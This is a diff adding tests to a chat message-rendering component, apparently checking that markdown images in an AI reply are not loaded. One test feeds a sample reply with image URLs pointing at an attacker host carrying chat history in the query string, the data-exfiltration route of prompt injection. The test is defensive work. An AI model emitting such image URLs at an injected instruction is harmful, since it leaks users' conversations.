@@ -30,6 +30,21 @@ describe("MessageBubble", () => {
     expect(screen.getAllByRole("listitem").map((li) => li.textContent)).toEqual(expect.arrayContaining(["one", "two"]));
   });
 
+  it("does not load a markdown image in a reply, so a hidden instruction cannot send data out in an image URL", () => {
+    const { container } = bubble({ content: "Done ![status](https://attacker.example/p?d=chat-history) ![](https://attacker.example/x)" });
+
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.innerHTML).not.toContain("attacker.example");
+    const blocked = screen.getAllByTestId("blocked-image");
+    expect(blocked.map((el) => el.textContent)).toEqual(["[image not loaded: status]", "[image not loaded]"]);
+  });
+
+  it("still renders links of a reply as links", () => {
+    bubble({ content: "See [the docs](https://example.com/docs)" });
+
+    expect(screen.getByRole("link", { name: "the docs" })).toHaveAttribute("href", "https://example.com/docs");
+  });
+
   it("does not turn markdown in the user's own message into markup", () => {
     bubble({ role: "user", content: "**not bold**" });
 
